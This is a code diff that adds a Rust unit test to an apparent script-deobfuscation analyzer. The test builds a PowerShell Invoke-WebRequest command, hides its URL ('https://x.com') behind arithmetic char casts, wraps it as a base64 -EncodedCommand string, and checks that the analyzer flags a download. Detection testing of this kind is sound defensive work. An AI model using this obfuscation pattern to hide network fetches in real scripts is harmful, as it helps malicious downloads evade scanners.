@@ -9137,6 +9137,29 @@ if ($finalScript -ne $null) {{
             report.traits
         );
     }
+
+    #[test]
+    fn char_concat_arithmetic_resolves_url() {
+        use base64::Engine;
+        let ps = r#"Invoke-WebRequest -Uri ([char](100+4)+[char](120-4)+[char](0x70+4)+[char](0x70)+[char](110+5)+[char](60-2)+[char](40+7)+[char](40+7)+[char](120)+[char](50-4)+[char](90+9)+[char](100+11)+[char](100+9))"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            ps.encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("https://x.com")
+            )
+        });
+        assert!(
+            has,
+            "arithmetic char-cast-concat not deobfuscated: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
